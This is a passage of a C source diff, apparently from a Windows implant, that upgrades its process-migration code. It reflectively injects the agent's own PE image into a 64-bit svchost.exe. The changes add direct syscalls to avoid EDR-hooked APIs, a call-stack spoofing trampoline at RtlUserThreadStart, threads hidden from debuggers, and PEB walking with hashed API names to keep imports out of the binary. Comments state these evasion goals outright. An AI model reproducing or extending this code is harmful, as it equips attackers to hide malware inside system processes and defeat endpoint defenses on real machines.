+        }
     }
 #endif
 
@@ -511,10 +936,13 @@ void migrate_to_pid(TLS_CONTEXT *pTls, const char *args)
                                   pCreateThread2;
     rfd.pCloseHandle           = (BOOL (WINAPI *)(HANDLE)) pCloseH;
 
-    /* ── 7. Allocate region in target: [loader | RflData | PE] ──────── */
+    /* ── 7. Allocate region in target: [loader | RflData | PE | tramp] ─ */
+    /* Extra 16 bytes at the end for the RtlUserThreadStart call-stack spoof
+     * trampoline.  This region stays RW (only the loader code prefix is
+     * flipped to RX in step 9), so _spoofed_thread_create can write it.   */
     SIZE_T cbLoader  = (SIZE_T)S_RFL_LOADER_SIZE;
     SIZE_T cbRfd     = sizeof(RflData);
-    SIZE_T cbTotal   = cbLoader + cbRfd + (SIZE_T)cbPE;
+    SIZE_T cbTotal   = cbLoader + cbRfd + (SIZE_T)cbPE + 16;
 
     PVOID  pRemote = NULL;
     NTSTATUS ns = SC_NtAllocateVirtualMemory(hProc, &pRemote, 0, &cbTotal,
@@ -571,13 +999,19 @@ void migrate_to_pid(TLS_CONTEXT *pTls, const char *args)
         return;
     }
 
-    /* ── 10. Spawn loader thread ─────────────────────────────────────── */
-    PVOID  pArg    = (BYTE *)pRemote + cbLoader;   /* &RflData in target */
+    /* ── 10. Spawn loader thread with RtlUserThreadStart call-stack spoof ─
+     * Trampoline lives at the RW tail: [loader RX | RflData RW | PE RW | tramp RW]
+     * _spoofed_thread_create writes { pRemote, pArg } there and starts the
+     * thread at ntdll!RtlUserThreadStart so the initial call-stack is:
+     *   ntdll!RtlUserThreadStart → rfl_loader(pArg)
+     * which is indistinguishable from a thread created by CreateThread.    */
+    PVOID  pArg    = (BYTE *)pRemote + cbLoader;          /* &RflData in target  */
+    PVOID  pTramp  = (BYTE *)pRemote + cbLoader + cbRfd + (SIZE_T)cbPE; /* +16 B RW */
     HANDLE hThread = NULL;
-    ns = SC_NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
-                             hProc, pRemote, pArg,
-                             THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
-                             0, 0, 0, NULL);
+    ns = _spoofed_thread_create(&hThread, hProc,
+                                pRemote, pArg,
+                                pTramp,
+                                THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER);
     CloseHandle(hProc);
 
     if (!NT_SUCCESS(ns) || !hThread) {
@@ -621,38 +1055,109 @@ void migrate_to_pid(TLS_CONTEXT *pTls, const char *args)
  *
  * Returns 0 if no suitable PID is found.
  */
+/*
+ * _find_host_pid
+ * --------------
+ * Locates a suitable 64-bit svchost.exe for reflective injection.
+ *
+ * Uses NtQuerySystemInformation(SystemProcessInformation=5) via direct syscall
+ * instead of CreateToolhelp32Snapshot — avoids the Win32 snapshot kernel
+ * callback that every EDR product hooks.
+ *
+ * Access mask is split: query-only handle (PROCESS_QUERY_LIMITED_INFORMATION)
+ * for WOW64 check; inject handle (VM_OPERATION|VM_WRITE|CREATE_THREAD) is
+ * opened only when we commit to injection in migrate_to_pid / auto_migrate.
+ */
+
+/* SYSTEM_PROCESS_INFORMATION subset — only fields we need */
+typedef struct _MY_SPI {
+    ULONG  NextEntryOffset;
+    ULONG  NumberOfThreads;
+    BYTE   _Reserved1[48];
+    PVOID  ImageName_Buffer;   /* points inside the struct — UNICODE_STRING.Buffer */
+    USHORT ImageName_Length;
+    USHORT ImageName_MaximumLength;
+    LONG   BasePriority;
+    HANDLE UniqueProcessId;
+    /* ... rest not needed */
+} MY_SPI;
+
 static DWORD _find_host_pid(void)
 {
-    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnap == INVALID_HANDLE_VALUE) return 0;
+    /* Probe buffer size first */
+    ULONG bufSize = 0;
+    /* NtQuerySystemInformation(5 = SystemProcessInformation, NULL, 0, &bufSize) */
+    sc_syscall4(SSN_NtQuerySystemInformation,
+                sc_get_ssn(SSN_NtQuerySystemInformation),
+                (PVOID)(ULONG_PTR)5, NULL,
+                (PVOID)(ULONG_PTR)0, (PVOID)&bufSize);
 
-    PROCESSENTRY32 pe;
-    pe.dwSize = sizeof(pe);
+    if (bufSize == 0) bufSize = 1024 * 1024;  /* fallback: 1 MB */
+    bufSize += 65536;  /* pad for new processes between calls */
+
+    BYTE *buf = (BYTE *)malloc(bufSize);
+    if (!buf) return 0;
+
+    ULONG retLen = 0;
+    NTSTATUS ns = sc_syscall4(SSN_NtQuerySystemInformation,
+                               sc_get_ssn(SSN_NtQuerySystemInformation),
+                               (PVOID)(ULONG_PTR)5, buf,
+                               (PVOID)(ULONG_PTR)bufSize, (PVOID)&retLen);
+    if (!NT_SUCCESS(ns)) { free(buf); return 0; }
+
+    /* Walk the linked list */
+    static const WCHAR svchostW[] = L"svchost.exe";
     DWORD bestPid = 0;
+    const BYTE *p = buf;
 
-    if (Process32First(hSnap, &pe)) {
-        do {
-            if (_wcsicmp(pe.szExeFile, L"svchost.exe") != 0) continue;
+    for (;;) {
+        /* SYSTEM_PROCESS_INFORMATION layout (x64):
+         *   +0x00  NextEntryOffset   (ULONG)
+         *   +0x04  NumberOfThreads   (ULONG)
+         *   +0x38  ImageName.Length  (USHORT)
+         *   +0x3A  ImageName.MaxLen  (USHORT)
+         *   +0x40  ImageName.Buffer  (PWSTR, absolute VA in calling process)
+         *   +0x60  UniqueProcessId   (HANDLE)
+         */
+        ULONG  nextOff;
+        USHORT nameLen;
+        PVOID  nameBuf;
+        HANDLE pid;
 
-            /* Try to open with minimum injection rights */
-            HANDLE hProc = OpenProcess(
-                PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
-                PROCESS_VM_READ      | PROCESS_CREATE_THREAD |
-                PROCESS_QUERY_LIMITED_INFORMATION,
-                FALSE, pe.th32ProcessID);
-            if (!hProc) continue;
+        memcpy(&nextOff, p + 0x00, 4);
+        memcpy(&nameLen, p + 0x38, 2);
+        memcpy(&nameBuf, p + 0x40, sizeof(PVOID));
+        memcpy(&pid,     p + 0x60, sizeof(HANDLE));
 
-            /* Skip WOW64 (32-bit) instances — we are x64 */
-            BOOL bWow64 = FALSE;
-            IsWow64Process(hProc, &bWow64);
-            CloseHandle(hProc);
-            if (bWow64) continue;
+        if (nameLen > 0 && nameBuf) {
+            /* nameLen is in bytes; svchost.exe is 22 bytes (11 wchars) */
+            if (nameLen == (USHORT)(sizeof(svchostW) - sizeof(WCHAR))) {
+                WCHAR name[16] = {0};
+                SIZE_T copyLen = nameLen < sizeof(name) - 2 ? nameLen : sizeof(name) - 2;
+                memcpy(name, nameBuf, copyLen);
+                if (_wcsicmp(name, svchostW) == 0) {
+                    DWORD candidatePid = (DWORD)(ULONG_PTR)pid;
+                    /* WOW64 check via query-only handle — separate low-priv open */
+                    HANDLE hQ = _nt_open_process(
+                        PROCESS_QUERY_LIMITED_INFORMATION, candidatePid);
+                    if (hQ && hQ != INVALID_HANDLE_VALUE) {
+                        BOOL bWow64 = FALSE;
+                        IsWow64Process(hQ, &bWow64);
+                        CloseHandle(hQ);
+                        if (!bWow64) {
+                            bestPid = candidatePid;
+                            break;
+                        }
+                    }
+                }
+            }
+        }
 
-            bestPid = pe.th32ProcessID;
-            break;   /* first eligible svchost wins */
-        } while (Process32Next(hSnap, &pe));
+        if (nextOff == 0) break;
+        p += nextOff;
     }
-    CloseHandle(hSnap);
+
+    free(buf);
     return bestPid;
 }
 
@@ -695,24 +1200,26 @@ BOOL auto_migrate(const char *keyPath)
              * inline so we avoid adding a NULL-pTls code path to migrate_to_pid.
              */
 
-            /* Read own PE */
-            char exePath[MAX_PATH] = {0};
-            if (GetModuleFileNameA(NULL, exePath, sizeof(exePath) - 1)) {
-                FILE *f = fopen(exePath, "rb");
-                if (f) {
-                    fseek(f, 0, SEEK_END);
-                    long fsz = ftell(f);
-                    fseek(f, 0, SEEK_SET);
-                    if (fsz > 0 && fsz <= 8 * 1024 * 1024) {
-                        DWORD cbPE = (DWORD)fsz;
-                        BYTE *pPE  = (BYTE *)malloc(cbPE);
-                        if (pPE && fread(pPE, 1, cbPE, f) == cbPE) {
+            /* Read own PE from in-process mapped image — no disk I/O */
+            {
+                DWORD cbPE = 0;
+                BYTE *pPE  = _read_self_pe(&cbPE);
+                if (pPE && cbPE > 0) {
+                    {
                             DWORD agentRunRva = _pe_find_export(pPE, cbPE, "AgentRun");
                             if (agentRunRva) {
-                                HMODULE hSelf2    = GetModuleHandleA(NULL);
-                                DWORD   keyRva   = (DWORD)((ULONG_PTR)g_key_path
-                                                            - (ULONG_PTR)hSelf2);
-                                HMODULE hK32     = GetModuleHandleA("kernel32.dll");
+                                /* PEB image base — avoids GetModuleHandleA IAT */
+                                void *_peb_am;
+#ifdef _WIN64
+                                __asm__ __volatile__("movq %%gs:0x60, %0" : "=r"(_peb_am));
+#else
+                                __asm__ __volatile__("movl %%fs:0x30, %0" : "=r"(_peb_am));
+#endif
+                                PVOID hSelf2 = _PEB_IMAGE_BASE(_peb_am);
+                                DWORD keyRva = (DWORD)((ULONG_PTR)g_key_path
+                                                        - (ULONG_PTR)hSelf2);
+                                /* G-03: PEB walk — no GetModuleHandleA/GetProcAddress in IAT */
+                                PVOID hK32am = peb_get_module(peb_hash_str("kernel32.dll"));
                                 typedef LPVOID (WINAPI *pVA_t)(LPVOID,SIZE_T,DWORD,DWORD);
                                 typedef BOOL   (WINAPI *pFIC_t)(HANDLE,LPCVOID,SIZE_T);
                                 typedef HMODULE(WINAPI *pLL_t)(LPCSTR);
@@ -721,19 +1228,18 @@ BOOL auto_migrate(const char *keyPath)
                                                                 LPTHREAD_START_ROUTINE,LPVOID,
                                                                 DWORD,LPDWORD);
                                 typedef BOOL   (WINAPI *pCH_t)(HANDLE);
-                                pVA_t  pVA  = (pVA_t) GetProcAddress(hK32,"VirtualAlloc");
-                                pFIC_t pFIC = (pFIC_t)GetProcAddress(hK32,"FlushInstructionCache");
-                                pLL_t  pLL  = (pLL_t) GetProcAddress(hK32,"LoadLibraryA");
-                                pGP_t  pGP  = (pGP_t) GetProcAddress(hK32,"GetProcAddress");
-                                pCT_t  pCT  = (pCT_t) GetProcAddress(hK32,"CreateThread");
-                                pCH_t  pCH  = (pCH_t) GetProcAddress(hK32,"CloseHandle");
+                                pVA_t  pVA  = (pVA_t) (void *)peb_get_export(hK32am,peb_hash_str("VirtualAlloc"));
+                                pFIC_t pFIC = (pFIC_t)(void *)peb_get_export(hK32am,peb_hash_str("FlushInstructionCache"));
+                                pLL_t  pLL  = (pLL_t) (void *)peb_get_export(hK32am,peb_hash_str("LoadLibraryA"));
+                                pGP_t  pGP  = (pGP_t) (void *)peb_get_export(hK32am,peb_hash_str("GetProcAddress"));
+                                pCT_t  pCT  = (pCT_t) (void *)peb_get_export(hK32am,peb_hash_str("CreateThread"));
+                                pCH_t  pCH  = (pCH_t) (void *)peb_get_export(hK32am,peb_hash_str("CloseHandle"));
                                 if (pVA && pFIC && pLL && pGP && pCT && pCH) {
-                                    HANDLE hProc2 = OpenProcess(
+                                    /* Split access: inject handle only */
+                                    HANDLE hProc2 = _nt_open_process(
                                         PROCESS_VM_OPERATION|PROCESS_VM_WRITE|
-                                        PROCESS_VM_READ|PROCESS_CREATE_THREAD|
-                                        PROCESS_QUERY_LIMITED_INFORMATION,
-                                        FALSE, hostPid);
-                                    if (hProc2) {
+                                        PROCESS_CREATE_THREAD, hostPid);
+                                    if (hProc2 && hProc2 != INVALID_HANDLE_VALUE) {
                                         RflData rfd2;
                                         ZeroMemory(&rfd2, sizeof(rfd2));
                                         rfd2.rawSize           = cbPE;
@@ -749,9 +1255,10 @@ BOOL auto_migrate(const char *keyPath)
                                         rfd2.pCreateThread         = pCT;
                                         rfd2.pCloseHandle          = pCH;
 
+                                        /* +16 bytes for RtlUserThreadStart trampoline */
                                         SIZE_T cbL   = (SIZE_T)S_RFL_LOADER_SIZE;
                                         SIZE_T cbR   = sizeof(RflData);
-                                        SIZE_T cbTot = cbL + cbR + (SIZE_T)cbPE;
+                                        SIZE_T cbTot = cbL + cbR + (SIZE_T)cbPE + 16;
                                         PVOID  pRem  = NULL;
                                         NTSTATUS ns2 = SC_NtAllocateVirtualMemory(
                                             hProc2, &pRem, 0, &cbTot,
@@ -774,18 +1281,17 @@ BOOL auto_migrate(const char *keyPath)
                                                 ULONG  oP2 = 0;
                                                 SC_NtProtectVirtualMemory(hProc2, &pB2,
                                                     &cP2, PAGE_EXECUTE_READ, &oP2);
-                                                PVOID  pArg2   = (BYTE *)pRem + cbL;
-                                                HANDLE hTh2    = NULL;
-                                                NTSTATUS ns3 = SC_NtCreateThreadEx(
-                                                    &hTh2, THREAD_ALL_ACCESS, NULL,
-                                                    hProc2, pRem, pArg2,
-                                                    THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
-                                                    0, 0, 0, NULL);
+                                                PVOID  pArg2  = (BYTE *)pRem + cbL;
+                                                PVOID  pTrp2  = (BYTE *)pRem + cbL + cbR + cbPE;
+                                                HANDLE hTh2   = NULL;
+                                                NTSTATUS ns3 = _spoofed_thread_create(
+                                                    &hTh2, hProc2,
+                                                    pRem, pArg2, pTrp2,
+                                                    THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER);
                                                 if (NT_SUCCESS(ns3) && hTh2) {
                                                     SC_NtClose(hTh2);
                                                     CloseHandle(hProc2);
                                                     free(pPE);
-                                                    fclose(f);
                                                     Sleep(500);
                                                     ExitProcess(0);
                                                     /* unreachable */
@@ -797,11 +1303,9 @@ BOOL auto_migrate(const char *keyPath)
                                 }
                             }
                         }
-                        if (pPE) free(pPE);
+                        free(pPE);
                     }
-                    fclose(f);
                 }
-            }
             /* Tier 1 failed — fall through to Tier 2 */
         }
     }
@@ -925,12 +1429,24 @@ BOOL auto_migrate(const char *keyPath)
 /* ── _is_injected ────────────────────────────────────────────────────────── */
 static BOOL _is_injected(void)
 {
-    HMODULE hProcess = GetModuleHandleA(NULL);
-    HMODULE hSelf    = NULL;
-    GetModuleHandleExA(
-        GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
-        GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
-        (LPCSTR)&_is_injected, &hSelf);
+    /*
+     * Get the process main module base from PEB — avoids GetModuleHandleA IAT.
+     * Get "our" module base via NtQueryVirtualMemory(MemoryBasicInformation)
+     * on &_is_injected — avoids GetModuleHandleExA IAT entry.
+     */
+    void *_peb_ii;
+#ifdef _WIN64
+    __asm__ __volatile__("movq %%gs:0x60, %0" : "=r"(_peb_ii));
+#else
+    __asm__ __volatile__("movl %%fs:0x30, %0" : "=r"(_peb_ii));
+#endif
+    PVOID hProcess = _PEB_IMAGE_BASE(_peb_ii);
+
+    /* Locate which module &_is_injected falls inside using VirtualQuery */
+    MEMORY_BASIC_INFORMATION mbi;
+    VirtualQuery((LPCVOID)&_is_injected, &mbi, sizeof(mbi));
+    PVOID hSelf = mbi.AllocationBase;
+
     return (hSelf != NULL) && (hSelf != hProcess);
 }
 
